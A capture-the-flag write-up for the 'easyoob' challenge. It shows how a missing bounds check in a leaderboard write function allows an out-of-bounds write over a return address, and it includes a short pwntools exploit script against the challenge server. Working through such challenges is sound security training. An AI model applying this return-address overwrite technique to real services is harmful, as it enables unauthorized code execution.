# 🍭 easyoob

Out-of-bounds access is a very nice to exploit bug. Try to overwrite some values in memory to control the program's execution flow.

MD5 (easyoob.zip) = 3e7063e1183d7e72adc3a13d9aeba4ed

Author: daniellimws

`nc challs.nusgreyhats.org 10524`

```sh
$ tree
.
├── easyoob
├── easyoob.c
└── easyoob.zip
$ checksec easyoob
[*] 'easyoob'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     # X
    Stack:    No canary found   # X
    NX:       NX enabled
    PIE:      No PIE (0x400000) # X
```

# Solution
When calling option 2:
```c
entry leaderboard[20];
// ... do {
    cmd = get_command();
    ///...
    else if (cmd.op == 2) handle_write(leaderboard, cmd);
// ...
```
There are no checks on `cmd.pos` to ensure it's within `range(20)`:
```c
void handle_write(entry* leaderboard, command cmd)
{
    leaderboard[cmd.pos].userid = cmd.userid;
    leaderboard[cmd.pos].score = cmd.score;
    printf("%d. [%d]  %d\n", cmd.pos, leaderboard[cmd.pos].userid, leaderboard[cmd.pos].score);
}
```
This means that the return pointer for `handle_write` (or any function above it in the call stack) can be overwritten with `ez_flag()`.

```python
from pwn import *
context.binary = './easyoob'
r = remote("challs.nusgreyhats.org", 10524)

r.sendlineafter(b'\n> ', b'2 21 %d 0' % (context.binary.symbols['ezflag']+5))
r.sendlineafter(b'\n> ', b'3')
print(r.recvall())
```

yeah that's it lol
